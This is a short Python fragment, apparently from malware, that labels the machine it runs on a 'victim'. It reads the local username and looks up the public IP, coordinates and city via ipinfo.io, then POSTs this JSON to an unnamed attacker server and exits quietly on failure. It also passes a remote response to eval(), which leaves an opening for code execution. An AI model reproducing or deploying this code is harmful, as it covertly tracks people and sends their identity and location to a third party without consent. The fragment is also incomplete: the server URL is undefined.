from datetime import datetime
import json
import os
import requests as r



victimId = str(datetime.now()).replace(" ", "").replace("-", "").replace(":", "").replace(".", "") 
def sendinfo(self):
        id = victimId
        user = os.getlogin()
        try:
            info = eval(r.get("https://ipinfo.io/json").text)
            ip = info["ip"]
            lat = info["loc"].split(",")[0]
            long = info["loc"].split(",")[1]
            location = info["city"] + ", " + info["region"] + ", " +info["country"]
            jsonFormat = {
                "victimId": id,
                "user": user,
                "ip": ip,
                "latitude": lat,
                "longitude": long,
                "location": location
            }
            r.post(URL, data=json.dumps(jsonFormat))                # URL of the server
        except:
            exit()